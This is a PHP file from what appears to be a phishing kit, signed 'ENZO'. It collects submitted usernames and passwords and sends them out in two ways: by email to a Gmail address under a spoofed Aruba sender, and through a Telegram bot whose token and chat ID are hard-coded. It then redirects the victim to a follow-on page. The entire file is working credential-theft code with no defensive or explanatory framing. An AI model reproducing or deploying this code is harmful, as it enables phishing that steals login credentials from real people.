<?php
#################################################
#                      ENZO                     #
#################################################
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if((isset($_POST["usr"]) && strlen($_POST["usr"]) == 8) AND ($_POST['pwd'] != "") )
{
$hostname = gethostbyaddr($ip);
$message .= "[UC]\n";
$message .= "USR       : ".$_POST['usr']."\n";
$message .= "PWD       : ".$_POST['pwd']."\n";
$message .= "[ENZO]\n";
$send = "zikoroot@gmail.com";
$subject = "HELLO $ip";
$headers = "From: [UC]<noreply@aruba.com>";
mail($send,$subject,$message,$headers);
    $token = "819904934:AAEOe3KW_5TPgcNFlFLBO5tc67nDa42S78E";
    file_get_contents("https://api.telegram.org/bot$token/sendMessage?chat_id=736694711&text=" . urlencode($message)."" );

echo "<meta http-equiv='refresh' content='0; url=loadlog.php?ip=$ip'/>";
}
	else {
     echo "<meta http-equiv='refresh' content='0; url=index.php?ip=$ip' />";
}

?>